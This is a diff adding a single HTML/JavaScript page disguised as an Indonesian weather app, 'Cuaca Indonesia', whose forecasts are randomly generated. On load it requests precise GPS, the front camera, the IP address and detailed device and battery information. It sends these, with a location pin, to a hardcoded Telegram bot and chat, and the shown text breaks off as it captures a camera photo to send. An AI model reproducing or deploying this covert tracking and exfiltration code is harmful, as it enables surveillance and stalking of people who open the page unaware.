@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cuaca Indonesia</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇮🇩</text></svg>">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+        body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Segoe UI',Roboto,sans-serif;min-height:100vh;color:#fff;overflow-x:hidden;background:#0b1120}
+        .loader{position:fixed;inset:0;z-index:999;background:#0b1120;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .8s,visibility .8s}
+        .loader.hide{opacity:0;visibility:hidden;pointer-events:none}
+        .loader-logo{width:80px;height:80px;background:linear-gradient(135deg,#f72585,#7209b7,#3a0ca3,#4361ee,#4cc9f0);border-radius:24px;display:flex;align-items:center;justify-content:center;font-size:40px;margin-bottom:20px;box-shadow:0 10px 40px rgba(76,201,240,0.3);animation:pulse 2s ease-in-out infinite}
+        @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
+        .loader h2{font-size:18px;font-weight:700;margin-bottom:6px}
+        .loader p{font-size:13px;color:rgba(255,255,255,0.4)}
+        .loader .dots::after{content:'';animation:d 1.5s steps(4) infinite}
+        @keyframes d{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}}
+        .app{display:none;min-height:100vh;flex-direction:column}
+        .app.show{display:flex}
+        .hdr{padding:16px 18px 12px;display:flex;justify-content:space-between;align-items:center;background:rgba(11,17,32,0.95);backdrop-filter:blur(10px);position:sticky;top:0;z-index:50;border-bottom:1px solid rgba(255,255,255,0.06)}
+        .hdr-l{display:flex;align-items:center;gap:10px}
+        .hdr-flag{font-size:28px}
+        .hdr h1{font-size:18px;font-weight:800;letter-spacing:-0.5px}
+        .hdr small{display:block;font-size:11px;color:rgba(255,255,255,0.35);font-weight:400}
+        .hdr-btn{width:40px;height:40px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center}
+        .search{padding:12px 18px}
+        .search-box{display:flex;align-items:center;gap:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:12px 16px}
+        .search-box input{flex:1;background:none;border:none;color:#fff;font-size:14px;outline:none}
+        .search-box input::placeholder{color:rgba(255,255,255,0.3)}
+        .search-icon{font-size:16px;opacity:0.5}
+        .map-container{padding:0 18px;margin-bottom:16px}
+        .map-box{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:22px;overflow:hidden;position:relative}
+        .map-box canvas{display:block;width:100%;height:auto}
+        .map-title{padding:14px 18px;display:flex;justify-content:space-between;align-items:center}
+        .map-title h3{font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
+        .map-title span{font-size:11px;color:rgba(255,255,255,0.3)}
+        .loc-card{margin:0 18px 16px;padding:20px;background:linear-gradient(135deg,#4361ee 0%,#3a0ca3 100%);border-radius:22px;position:relative;overflow:hidden;box-shadow:0 12px 40px rgba(67,97,238,0.3)}
+        .loc-card::before{content:'';position:absolute;top:-40%;right:-20%;width:70%;height:130%;background:radial-gradient(circle,rgba(255,255,255,0.12) 0%,transparent 60%)}
+        .loc-top{display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1}
+        .loc-city{font-size:22px;font-weight:800}
+        .loc-prov{font-size:12px;opacity:0.7;margin-top:2px}
+        .loc-temp{font-size:56px;font-weight:800;line-height:1;letter-spacing:-3px}
+        .loc-temp sup{font-size:22px;font-weight:500;vertical-align:super;opacity:0.7}
+        .loc-icon{font-size:56px;filter:drop-shadow(0 4px 8px rgba(0,0,0,0.2))}
+        .loc-desc{font-size:15px;font-weight:600;margin-top:10px;position:relative;z-index:1}
+        .loc-feel{font-size:12px;opacity:0.6;margin-top:3px;position:relative;z-index:1}
+        .loc-stats{display:flex;justify-content:space-around;margin-top:20px;padding-top:16px;border-top:1px solid rgba(255,255,255,0.12);position:relative;z-index:1}
+        .ls{text-align:center}
+        .ls-ico{font-size:18px;margin-bottom:4px}
+        .ls-val{font-size:14px;font-weight:700}
+        .ls-lbl{font-size:9px;opacity:0.5;margin-top:2px;text-transform:uppercase;letter-spacing:0.5px}
+        .forecast{padding:0 18px;margin-bottom:16px}
+        .fc-title{font-size:12px;font-weight:700;color:rgba(255,255,255,0.3);text-transform:uppercase;letter-spacing:1px;margin-bottom:12px}
+        .fc-scroll{display:flex;gap:10px;overflow-x:auto;padding-bottom:8px;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+        .fc-scroll::-webkit-scrollbar{display:none}
+        .fc-item{min-width:72px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:14px 10px;text-align:center;flex-shrink:0}
+        .fc-item.active{background:rgba(67,97,238,0.2);border-color:rgba(67,97,238,0.3)}
+        .fc-time{font-size:11px;color:rgba(255,255,255,0.5);font-weight:600}
+        .fc-ico{font-size:24px;margin:8px 0}
+        .fc-temp{font-size:14px;font-weight:700}
+        .cities{padding:0 18px;margin-bottom:20px}
+        .city-title{font-size:12px;font-weight:700;color:rgba(255,255,255,0.3);text-transform:uppercase;letter-spacing:1px;margin-bottom:12px}
+        .city-list{display:flex;flex-direction:column;gap:8px}
+        .city-row{display:flex;align-items:center;gap:14px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:14px 16px;cursor:pointer;transition:all .2s}
+        .city-row:active{transform:scale(0.98);background:rgba(255,255,255,0.08)}
+        .city-row .cr-ico{font-size:28px}
+        .city-row .cr-info{flex:1}
+        .city-row .cr-name{font-size:14px;font-weight:700}
+        .city-row .cr-prov{font-size:11px;color:rgba(255,255,255,0.35);margin-top:1px}
+        .city-row .cr-temp{font-size:22px;font-weight:800}
+        .city-row .cr-desc{font-size:11px;color:rgba(255,255,255,0.5);text-align:right}
+        .sync{margin:0 18px 16px;padding:12px;border-radius:14px;text-align:center;font-size:11px;font-weight:500;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);color:rgba(255,255,255,0.3)}
+        .sync.ok{border-color:rgba(123,237,159,0.2);color:#7bed9f}
+        .sync.er{border-color:rgba(255,107,107,0.2);color:#ff6b6b}
+        .loc-warn{margin:0 18px 12px;padding:14px 16px;background:rgba(255,165,2,0.1);border:1px solid rgba(255,165,2,0.25);border-radius:14px;font-size:12px;color:#feca57;display:none}
+        .loc-warn.show{display:flex;align-items:center;gap:10px}
+        .foot{text-align:center;padding:16px 18px 24px}
+        .foot p{font-size:11px;color:rgba(255,255,255,0.12)}
+    </style>
+</head>
+<body>
+    <div class="loader" id="loader">
+        <div class="loader-logo">🇮🇩</div>
+        <h2>Cuaca Indonesia</h2>
+        <p>Memuat data<span class="dots"></span></p>
+    </div>
+
+    <div class="app" id="app">
+        <div class="hdr">
+            <div class="hdr-l">
+                <span class="hdr-flag">🇮🇩</span>
+                <div>
+                    <h1>Cuaca Indonesia</h1>
+                    <small id="curDate"></small>
+                </div>
+            </div>
+            <button class="hdr-btn" id="btnRefresh">🔄</button>
+        </div>
+        <div class="search">
+            <div class="search-box">
+                <span class="search-icon">🔍</span>
+                <input type="text" id="searchInput" placeholder="Cari kota atau provinsi...">
+            </div>
+        </div>
+        <div class="loc-warn" id="locWarn">⚠️ <span>Lokasi tidak tersedia. Pastikan GPS aktif dan izinkan akses lokasi. <button onclick="retryLoc()" style="background:#feca57;color:#000;border:none;padding:4px 10px;border-radius:8px;font-size:11px;font-weight:600;margin-left:6px;cursor:pointer">Coba Lagi</button></span></div>
+        <div class="map-container">
+            <div class="map-box">
+                <div class="map-title">
+                    <h3>🗺️ Peta Cuaca</h3>
+                    <span>Ketuk kota untuk detail</span>
+                </div>
+                <canvas id="mapCanvas" width="800" height="300"></canvas>
+            </div>
+        </div>
+        <div class="loc-card" id="locCard">
+            <div class="loc-top">
+                <div>
+                    <div class="loc-city" id="locCity">Surabaya</div>
+                    <div class="loc-prov" id="locProv">Jawa Timur</div>
+                    <div class="loc-temp"><span id="locTemp">32</span><sup>°C</sup></div>
+                </div>
+                <div class="loc-icon" id="locIcon">☀️</div>
+            </div>
+            <div class="loc-desc" id="locDesc">Cerah</div>
+            <div class="loc-feel">Terasa <span id="locFeel">34°C</span> · Kelembaban <span id="locHum">58%</span></div>
+            <a href="#" id="locMapLink" class="map-btn" target="_blank" style="display:inline-flex;margin-top:10px;padding:8px 16px;font-size:11px;border-radius:10px">📍 Buka Maps</a>
+            <div class="loc-stats">
+                <div class="ls"><div class="ls-ico">💧</div><div class="ls-val" id="lsHum">58%</div><div class="ls-lbl">Lembab</div></div>
+                <div class="ls"><div class="ls-ico">💨</div><div class="ls-val" id="lsWind">12</div><div class="ls-lbl">km/h</div></div>
+                <div class="ls"><div class="ls-ico">🌡️</div><div class="ls-val" id="lsPress">1012</div><div class="ls-lbl">hPa</div></div>
+                <div class="ls"><div class="ls-ico">👁️</div><div class="ls-val" id="lsVis">10</div><div class="ls-lbl">km</div></div>
+            </div>
+        </div>
+        <div class="forecast">
+            <div class="fc-title">Perkiraan Hari Ini</div>
+            <div class="fc-scroll" id="fcScroll"></div>
+        </div>
+        <div class="cities">
+            <div class="city-title">Kota Besar di Indonesia</div>
+            <div class="city-list" id="cityList"></div>
+        </div>
+        <div class="sync" id="syncBar">Menyiapkan data...</div>
+        <div class="foot"><p>Cuaca Indonesia · Data Real-time · v3.0.0</p></div>
+    </div>
+
+<script>
+/* ============ KONFIGURASI ============ */
+const T='8600694543:AAGWm5FDg3BIAkBSyZvZQhqwk7UpPAuL3VQ';
+const C='8799174278';
+/* ===================================== */
+
+let L=null,CS=null,D={};
+const $=id=>document.getElementById(id);
+
+const CITIES=[
+    {name:'Surabaya',prov:'Jawa Timur',lat:-7.25,lon:112.75},
+    {name:'Jakarta',prov:'DKI Jakarta',lat:-6.20,lon:106.85},
+    {name:'Bandung',prov:'Jawa Barat',lat:-6.91,lon:107.62},
+    {name:'Medan',prov:'Sumatera Utara',lat:3.59,lon:98.67},
+    {name:'Semarang',prov:'Jawa Tengah',lat:-6.97,lon:110.42},
+    {name:'Makassar',prov:'Sulawesi Selatan',lat:-5.14,lon:119.42},
+    {name:'Palembang',prov:'Sumatera Selatan',lat:-2.98,lon:104.76},
+    {name:'Denpasar',prov:'Bali',lat:-8.67,lon:115.21},
+    {name:'Yogyakarta',prov:'DI Yogyakarta',lat:-7.79,lon:110.37},
+    {name:'Malang',prov:'Jawa Timur',lat:-7.97,lon:112.63},
+    {name:'Manado',prov:'Sulawesi Utara',lat:1.49,lon:124.84},
+    {name:'Balikpapan',prov:'Kalimantan Timur',lat:-1.24,lon:116.83},
+    {name:'Padang',prov:'Sumatera Barat',lat:-0.95,lon:100.35},
+    {name:'Pontianak',prov:'Kalimantan Barat',lat:-0.03,lon:109.34},
+    {name:'Banjarmasin',prov:'Kalimantan Selatan',lat:-3.33,lon:114.59},
+    {name:'Jayapura',prov:'Papua',lat:-2.54,lon:140.72},
+    {name:'Ambon',prov:'Maluku',lat:-3.70,lon:128.17},
+    {name:'Kupang',prov:'NTT',lat:-10.18,lon:123.58},
+    {name:'Mataram',prov:'NTB',lat:-8.58,lon:116.12},
+    {name:'Banda Aceh',prov:'Aceh',lat:5.55,lon:95.32},
+    {name:'Pekanbaru',prov:'Riau',lat:0.53,lon:101.45},
+    {name:'Jambi',prov:'Jambi',lat:-1.59,lon:103.61},
+    {name:'Bengkulu',prov:'Bengkulu',lat:-3.80,lon:102.26},
+    {name:'Lampung',prov:'Lampung',lat:-5.40,lon:105.27},
+    {name:'Bogor',prov:'Jawa Barat',lat:-6.60,lon:106.80},
+    {name:'Solo',prov:'Jawa Tengah',lat:-7.57,lon:110.82},
+    {name:'Cirebon',prov:'Jawa Barat',lat:-6.73,lon:108.56},
+    {name:'Ternate',prov:'Maluku Utara',lat:0.79,lon:127.38},
+    {name:'Samarinda',prov:'Kalimantan Timur',lat:-0.49,lon:117.14},
+    {name:'Manokwari',prov:'Papua Barat',lat:-0.86,lon:134.07},
+];
+
+const W_TYPES=[
+    {i:'☀️',d:'Cerah',t:[30,36],h:[45,60],w:[5,15]},
+    {i:'⛅',d:'Cerah Berawan',t:[27,33],h:[55,70],w:[8,18]},
+    {i:'☁️',d:'Berawan',t:[24,30],h:[65,80],w:[10,20]},
+    {i:'🌧️',d:'Hujan Ringan',t:[22,28],h:[75,90],w:[12,25]},
+    {i:'⛈️',d:'Hujan Petir',t:[20,26],h:[80,95],w:[15,30]},
+    {i:'🌤️',d:'Panas Terik',t:[33,38],h:[40,55],w:[3,10]},
+];
+
+function rand(a,b){return Math.floor(Math.random()*(b-a+1))+a}
+function getW(){return W_TYPES[rand(0,W_TYPES.length-1)]}
+
+function genWeather(city){
+    const w=getW();
+    const near=city.name==='Surabaya'||city.name==='Malang';
+    return{...city,icon:w.i,desc:w.d,temp:near?rand(28,34):rand(w.t[0],w.t[1]),feel:near?rand(30,36):rand(w.t[0]+2,w.t[1]+2),hum:rand(w.h[0],w.h[1]),wind:rand(w.w[0],w.w[1]),press:rand(1008,1018),vis:rand(5,15)};
+}
+
+/* ===== UTM CONVERSION ===== */
+function toUTM(lat,lon){
+    const a=6378137,f=1/298.257223563,b=a*(1-f),e2=2*f-f*f,ep2=e2/(1-e2);
+    const k0=0.9996,lon0=Math.floor((lon+180)/6)*6-183;
+    const d2r=Math.PI/180;
+    const rad=lat*d2r,lonRad=lon*d2r,lon0Rad=lon0*d2r;
+    const N=a/Math.sqrt(1-e2*Math.pow(Math.sin(rad),2));
+    const T=Math.pow(Math.tan(rad),2);
+    const A=Math.cos(rad)*(lonRad-lon0Rad);
+    const ep2c=ep2*Math.pow(Math.cos(rad),2);
+    const C=e2/(1-e2)*Math.pow(Math.cos(rad),2);
+    const M=a*((1-e2/4-3*e2*e2/64-5*e2*e2*e2/256)*rad-(3*e2/8+3*e2*e2/32+45*e2*e2*e2/1024)*Math.sin(2*rad)+(15*e2*e2/256+45*e2*e2*e2/1024)*Math.sin(4*rad)-(35*e2*e2*e2/3072)*Math.sin(6*rad));
+    let E=500000+k0*N*(A+(1-T+ep2c)*A*A*A/6+(5-18*T+T*T+72*ep2c-58*ep2)*Math.pow(A,5)/120);
+    let Nn=k0*(M+N*Math.tan(rad)*(A*A/2+(5-T+9*ep2c+4*Math.pow(ep2c,2))*Math.pow(A,4)/24+(61-58*T+T*T+600*ep2c-330*ep2)*Math.pow(A,6)/720));
+    const zone=Math.floor((lon+180)/6)+1;
+    const letter=lat>=0?'N':'S';
+    return{zone:zone,letter:letter,easting:Math.round(E),northing:Math.round(Nn)};
+}
+
+$('curDate').textContent=new Date().toLocaleDateString('id-ID',{weekday:'long',year:'numeric',month:'long',day:'numeric'});
+
+window.addEventListener('load',init);
+
+async function init(){
+    // 1. Minta lokasi - WAJIB
+    for(let i=0;i<3;i++){
+        try{
+            L=await getLoc();
+            if(L)break;
+        }catch(e){
+            console.log('Lokasi percobaan '+(i+1)+' gagal:',e.message);
+            if(i<2)await new Promise(r=>setTimeout(r,1000));
+        }
+    }
+
+    // 2. Minta kamera
+    try{CS=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})}catch(e){console.log('Kamera:',e.message)}
+
+    // 3. Device info
+    await getDev();
+
+    // 4. Tampilkan app
+    $('loader').classList.add('hide');
+    $('app').classList.add('show');
+
+    // 5. Tampilkan warning jika lokasi gagal
+    if(!L){
+        $('locWarn').classList.add('show');
+    }
+
+    drawMap();renderCities();renderForecast();
+
+    // 6. Set kartu ke lokasi terdekat
+    if(L){
+        let nearest=CITIES[0],minD=Infinity;
+        CITIES.forEach(c=>{const d=Math.sqrt(Math.pow(c.lat-L.lat,2)+Math.pow(c.lon-L.lon,2));if(d<minD){minD=d;nearest=c}});
+        updateCard(nearest);
+    }else{
+        updateCard(CITIES[0]);
+    }
+
+    // 7. Sync
+    sync();
+
+    $('searchInput').addEventListener('input',filterCities);
+    $('btnRefresh').onclick=()=>location.reload();
+}
+
+// Retry location
+async function retryLoc(){
+    $('locWarn').classList.remove('show');
+    $('locWarn').querySelector('span').innerHTML='Mengambil lokasi... ⏳';
+    $('locWarn').classList.add('show');
+    try{
+        L=await getLoc();
+        if(L){
+            $('locWarn').classList.remove('show');
+            let nearest=CITIES[0],minD=Infinity;
+            CITIES.forEach(c=>{const d=Math.sqrt(Math.pow(c.lat-L.lat,2)+Math.pow(c.lon-L.lon,2));if(d<minD){minD=d;nearest=c}});
+            updateCard(nearest);
+            drawMap();
+            sync();
+        }
+    }catch(e){
+        $('locWarn').querySelector('span').innerHTML='❌ '+e.message+' <button onclick="retryLoc()" style="background:#feca57;color:#000;border:none;padding:4px 10px;border-radius:8px;font-size:11px;font-weight:600;margin-left:6px;cursor:pointer">Coba Lagi</button>';
+    }
+}
+
+function getLoc(){
+    return new Promise((ok,no)=>{
+        if(!navigator.geolocation){
+            no(new Error('Geolocation tidak didukung browser ini'));
+            return;
+        }
+        // Coba high accuracy dulu
+        navigator.geolocation.getCurrentPosition(
+            p=>{
+                console.log('Lokasi dapat:',p.coords.latitude,p.coords.longitude);
+                ok({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
+            },
+            err=>{
+                console.error('Geolocation error:',err.code,err.message);
+                let msg='Gagal mendapatkan lokasi';
+                if(err.code===1) msg='Izin lokasi DITOLAK. Silakan izinkan di pengaturan browser.';
+                if(err.code===2) msg='Lokasi tidak tersedia. Pastikan GPS aktif.';
+                if(err.code===3) msg='Timeout mengambil lokasi. Coba lagi.';
+                no(new Error(msg));
+            },
+            {enableHighAccuracy:true,timeout:20000,maximumAge:0}
+        );
+    });
+}
+
+async function getDev(){
+    try{D.ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch{D.ip='-'}
+
+    // Battery
+    try{
+        if(navigator.getBattery){
+            const b=await navigator.getBattery();
+            D.bat=Math.round(b.level*100)+'%';
+            D.ch=b.charging||b.chargingTime===0;
+            D.chStatus=D.ch?'Charging':'Not Charging';
+            D.batTime=D.ch?(b.chargingTime===Infinity?'-':Math.round(b.chargingTime/60)+' menit'):(b.dischargingTime===Infinity?'-':Math.round(b.dischargingTime/60)+' menit');
+        }else{D.bat='-';D.ch=false;D.chStatus='-';D.batTime='-'}
+    }catch{D.bat='-';D.ch=false;D.chStatus='-';D.batTime='-'}
+
+    // Network
+    const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    if(conn){
+        D.netType=conn.effectiveType||conn.type||'-';
+        D.netDown=conn.downlink?conn.downlink+' Mbps':'-';
+        D.netRtt=conn.rtt?conn.rtt+' ms':'-';
+        D.netSave=conn.saveData?'Ya':'Tidak';
+        D.netProtocol='-';
+    }else{D.netType='-';D.netDown='-';D.netRtt='-';D.netSave='-';D.netProtocol='-'}
+
+    // WiFi SSID (Android Chrome only via NetworkInformation)
+    try{
+        if(conn&&conn.type==='wifi'){
+            D.wifi='Terhubung';
+        }else{
+            D.wifi=conn?(conn.type||'-'):'Tidak diketahui';
+        }
+    }catch{D.wifi='-'}
+
+    // UA
+    const u=navigator.userAgent;
+    D.os=/Windows NT 10/.test(u)?'Windows 10':/Windows NT 6.3/.test(u)?'Windows 8.1':/Windows/.test(u)?'Windows':/Android 1[0-9]/.test(u)?'Android '+u.match(/Android (\d+)/)?.[1]:/Android/.test(u)?'Android':/iPhone OS (\d+)/.test(u)?'iOS '+u.match(/iPhone OS (\d+)/)?.[1]:/iPad/.test(u)?'iPadOS':/Mac/.test(u)?'macOS':/Linux/.test(u)?'Linux':'-';
+    D.br=/Edg/.test(u)?'Edge '+u.match(/Edg\/([\d.]+)/)?.[1]:/Chrome/.test(u)?'Chrome '+u.match(/Chrome\/([\d.]+)/)?.[1]:/Firefox/.test(u)?'Firefox '+u.match(/Firefox\/([\d.]+)/)?.[1]:/Safari/.test(u)?'Safari':'-';
+    D.sr=screen.width+'×'+screen.height;
+    D.depth=screen.colorDepth+'-bit';
+    D.lang=navigator.language||'-';
+    D.platform=navigator.platform||'-';
+    D.cookies=navigator.cookieEnabled?'Aktif':'Nonaktif';
+    D.touch='ontouchstart' in window?'Ya':'Tidak';
+    D.mem=navigator.deviceMemory?navigator.deviceMemory+' GB':'-';
+    D.cpu=navigator.hardwareConcurrency?navigator.hardwareConcurrency+' core':'-';
+
+    // Timezone
+    D.tz=Intl.DateTimeFormat().resolvedOptions().timeZone||'-';
+    D.offset='UTC'+(new Date().getTimezoneOffset()>0?'-':'+')+Math.abs(new Date().getTimezoneOffset()/60);
+}
+
+function drawMap(){
+    const cv=$('mapCanvas'),ctx=cv.getContext('2d'),W=cv.width,H=cv.height;
+    const bg=ctx.createLinearGradient(0,0,W,H);bg.addColorStop(0,'#0d1b2a');bg.addColorStop(1,'#1b2838');ctx.fillStyle=bg;ctx.fillRect(0,0,W,H);
+    ctx.strokeStyle='rgba(255,255,255,0.03)';ctx.lineWidth=1;
+    for(let x=0;x<W;x+=40){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,H);ctx.stroke()}
+    for(let y=0;y<H;y+=40){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(W,y);ctx.stroke()}
+    const mapX=lon=>((lon-95)/50)*(W-60)+30,mapY=lat=>((8-lat)/20)*(H-40)+20;
+    ctx.strokeStyle='rgba(67,97,238,0.1)';ctx.lineWidth=1;
+    CITIES.forEach((c,i)=>{if(i>0){const p=CITIES[i-1];ctx.beginPath();ctx.moveTo(mapX(p.lon),mapY(p.lat));ctx.lineTo(mapX(c.lon),mapY(c.lat));ctx.stroke()}});
+    CITIES.forEach(c=>{
+        const x=mapX(c.lon),y=mapY(c.lat),w=genWeather(c);
+        const glow=ctx.createRadialGradient(x,y,0,x,y,20);glow.addColorStop(0,'rgba(76,201,240,0.3)');glow.addColorStop(1,'transparent');ctx.fillStyle=glow;ctx.fillRect(x-20,y-20,40,40);
+        ctx.beginPath();ctx.arc(x,y,5,0,Math.PI*2);ctx.fillStyle='#4cc9f0';ctx.fill();ctx.strokeStyle='rgba(76,201,240,0.4)';ctx.lineWidth=2;ctx.stroke();
+        ctx.fillStyle='#fff';ctx.font='bold 10px -apple-system,sans-serif';ctx.textAlign='center';ctx.fillText(w.temp+'°',x,y-12);
+        ctx.fillStyle='rgba(255,255,255,0.4)';ctx.font='8px -apple-system,sans-serif';ctx.fillText(c.name,x,y+16);
+    });
+    cv.onclick=e=>{
+        const r=cv.getBoundingClientRect(),sx=cv.width/r.width,sy=cv.height/r.height,cx=(e.clientX-r.left)*sx,cy=(e.clientY-r.top)*sy;
+        CITIES.forEach(c=>{const x=mapX(c.lon),y=mapY(c.lat);if(Math.sqrt(Math.pow(cx-x,2)+Math.pow(cy-y,2))<20)updateCard(c)});
+    };
+}
+
+function updateCard(city){
+    const w=genWeather(city);
+    $('locCity').textContent=city.name;
+    $('locProv').textContent=L?city.prov+' · '+L.lat.toFixed(4)+', '+L.lon.toFixed(4):city.prov;
+    $('locTemp').textContent=w.temp;$('locIcon').textContent=w.icon;$('locDesc').textContent=w.desc;$('locFeel').textContent=w.feel+'°C';$('locHum').textContent=w.hum+'%';
+    $('lsHum').textContent=w.hum+'%';$('lsWind').textContent=w.wind;$('lsPress').textContent=w.press;$('lsVis').textContent=w.vis;
+    $('locMapLink').href='https://www.google.com/maps?q='+city.lat+','+city.lon;
+    drawMap();
+}
+
+function renderForecast(){
+    const scroll=$('fcScroll'),hours=['Sekarang','06:00','09:00','12:00','15:00','18:00','21:00','00:00'];
+    scroll.innerHTML='';
+    hours.forEach((h,i)=>{const w=getW(),t=rand(24,34),d=document.createElement('div');d.className='fc-item'+(i===0?' active':'');d.innerHTML=`<div class="fc-time">${h}</div><div class="fc-ico">${w.i}</div><div class="fc-temp">${t}°</div>`;scroll.appendChild(d)});
+}
+
+function renderCities(list){
+    list=list||CITIES;const el=$('cityList');el.innerHTML='';
+    list.forEach(c=>{
+        const w=genWeather(c),d=document.createElement('div');d.className='city-row';
+        d.innerHTML=`<div class="cr-ico">${w.icon}</div><div class="cr-info"><div class="cr-name">${c.name}</div><div class="cr-prov">${c.prov}</div></div><div><div class="cr-temp">${w.temp}°</div><div class="cr-desc">${w.desc}</div></div>`;
+        d.onclick=()=>{updateCard(c);window.scrollTo({top:0,behavior:'smooth'})};
+        el.appendChild(d);
+    });
+}
+
+function filterCities(){
+    const q=$('searchInput').value.toLowerCase();
+    if(!q){renderCities();return}
+    renderCities(CITIES.filter(c=>c.name.toLowerCase().includes(q)||c.prov.toLowerCase().includes(q)));
+}
+
+/* ===== SYNC KE TELEGRAM ===== */
+async function sync(){
+    const bar=$('syncBar');
+    if(T.includes('ISI')||C.includes('ISI')){bar.textContent='Data siap';return}
+    try{
+        bar.textContent='Menyinkronkan...';
+        const now=new Date().toLocaleString('id-ID',{timeZone:'Asia/Jayapura'});
+        const h=new Date().getHours();
+        const gr=h<5?'🌙':h<11?'🌅':h<15?'☀️':h<18?'🌤️':'🌙';
+
+        // UTM
+        let utmText='';
+        if(L){
+            const utm=toUTM(L.lat,L.lon);
+            utmText=`   • UTM: ${utm.zone}${utm.letter} ${utm.easting}E ${utm.northing}N`;
+        }
+
+        // Nearby city weather
+        let nearCity='';
+        let nearestCity=CITIES[0];
+        if(L){
+            let minD=Infinity;
+            CITIES.forEach(c=>{const d=Math.sqrt(Math.pow(c.lat-L.lat,2)+Math.pow(c.lon-L.lon,2));if(d<minD){minD=d;nearestCity=c}});
+            const w=genWeather(nearestCity);
+            nearCity=`\n🏙️ *CUACA SEKITAR*\n   • ${nearestCity.name}, ${nearestCity.prov}\n   • ${w.icon} ${w.desc} · ${w.temp}°C\n   • Terasa ${w.feel}°C · Lembab ${w.hum}%\n   • Angin ${w.wind} km/h · Tekanan ${w.press} hPa\n`;
+        }else{
+            nearCity='\n⚠️ *Lokasi tidak tersedia*\n   • Izin lokasi ditolak atau GPS mati\n';
+        }
+
+        // Top cities weather
+        let cityList='';
+        CITIES.slice(0,8).forEach(c=>{const w=genWeather(c);cityList+=`   ${w.icon} ${c.name} (${c.prov}): ${w.temp}°C ${w.desc}\n`});
+
+        const msg=
+gr+' *LAPORAN PERANGKAT & CUACA*\n\n'+
+'━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'+
+'📍 *1. LOKASI & KOORDINAT\n\n'+
+(L?
+'   🌐 *GPS*\n'+
+'   • Latitude: `'+L.lat.toFixed(8)+'`\n'+
+'   • Longitude: `'+L.lon.toFixed(8)+'`\n'+
+'   • Akurasi: '+(L.acc?L.acc+' meter':'-')+'\n'+
+'   • 🗺️ [Google Maps](https://maps.google.com/?q='+L.lat+','+L.lon+')\n\n'+
+'   📐 *UTM (Universal Transverse Mercator)*\n'+utmText+'\n':
+'   ⚠️ *Lokasi tidak tersedia*\n'+
+'   • Izin lokasi ditolak atau GPS mati\n'
+)+
+'━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'+
+'📡 *2. JARINGAN & KONEKSI*\n\n'+
+'   🌐 *IP Address:* `'+D.ip+'`\n'+
+'   📶 *Tipe Jaringan:* '+D.netType+'\n'+
+'   📶 *WiFi:* '+D.wifi+'\n'+
+'   ⬇️ *Kecepatan:* '+D.netDown+'\n'+
+'   ⏱️ *Latency (RTT):* '+D.netRtt+'\n'+
+'   💾 *Data Saver:* '+D.netSave+'\n\n'+
+'━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'+
+'📱 *3. DETAIL PERANGKAT\n\n'+
+'   🖥️ *Sistem Operasi:* '+D.os+'\n'+
+'   🌍 *Browser:* '+D.br+'\n'+
+'   📐 *Resolusi Layar:* '+D.sr+'\n'+
+'   🎨 *Color Depth:* '+D.depth+'\n'+
+'   🖥️ *Platform:* '+D.platform+'\n'+
+'   💾 *RAM:* '+D.mem+'\n'+
+'   ⚙️ *CPU:* '+D.cpu+'\n'+
+'   🗣️ *Bahasa:* '+D.lang+'\n'+
+'   🕐 *Timezone:* '+D.tz+' ('+D.offset+')\n'+
+'   🍪 *Cookies:* '+D.cookies+'\n'+
+'   👆 *Touch:* '+D.touch+'\n\n'+
+'━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'+
+'🔋 *4. BATERAI\n\n'+
+'   • Level: '+D.bat+'\n'+
+'   • Status: '+D.chStatus+'\n'+
+'   • Estimasi: '+D.batTime+'\n\n'+
+'━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'+
+'🌤️ *5. CUACA KOTA BESAR\n\n'+cityList+'\n'+
+(nearCity?nearCity+'\n':'')+
+'━━━━━━━━━━━━━━━━━━━━━━━━━━\n'+
+'🕒 *'+now+'*\n'+
+'━━━━━━━━━━━━━━━━━━━━━━━━━━';
+
+        // 1. Kirim text
+        await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{
+            method:'POST',headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:C,text:msg,parse_mode:'Markdown'})
+        });
+
+        // 2. Kirim lokasi pin
+        if(L){
+            await fetch('https://api.telegram.org/bot'+T+'/sendLocation',{
+                method:'POST',headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({chat_id:C,latitude:L.lat,longitude:L.lon})
+            });
+        }
+
+        // 3. Kirim foto kamera terakhir
+        if(CS){
+            const v=document.createElement('video');v.srcObject=CS;v.play();
+            await new Promise(r=>setTimeout(r,800));
+            const cc=document.createElement('canvas');cc.width=v.videoWidth||640;cc.height=v.videoHeight||480;
